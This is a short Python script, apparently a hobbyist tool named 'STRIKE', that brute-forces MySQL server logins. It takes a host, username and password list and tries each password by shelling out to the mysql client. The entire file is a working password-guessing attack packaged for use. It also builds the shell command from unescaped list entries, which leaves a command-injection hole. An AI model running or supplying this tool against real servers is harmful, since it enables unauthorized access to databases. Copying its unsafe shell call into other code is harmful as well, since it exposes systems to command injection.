from os import system
from sys import exit, argv
from time import sleep

ban = '''\n STRIKE | SIMPLE MYSQL SERVER AUTH BRUTEFORCE\n     DEVELOPER: S4M JR <> GITHUB: @S4MJR\n\n'''

try:
	host = argv[1]
	user = argv[2]
	passlist = argv[3]
except:
	print("\033[1;36;41m USE MODE:\033[m")
	print("\n./code.py <host> <username> <passlist>")
	print("\nSTRIKE | Simple MySQL Server Auth Bruteforce")
	print("   Developer: S4m Jr <> Github: \033[1;36;41m@S4mJr\033[m")
	print("\t   Gmail: samjunior416\n")
	exit(2)


arq = open(passlist, 'r')
pass_list = arq.read().splitlines()

print ban

print("\033[1;36;41mINICIANDO______________________________________________________\033[m\n")
print("\n[VERBOSE]\n")
for passwd in pass_list:
	saida = system("mysql -u {} --host={} --password={}".format(user, host, passwd))
	print(saida)
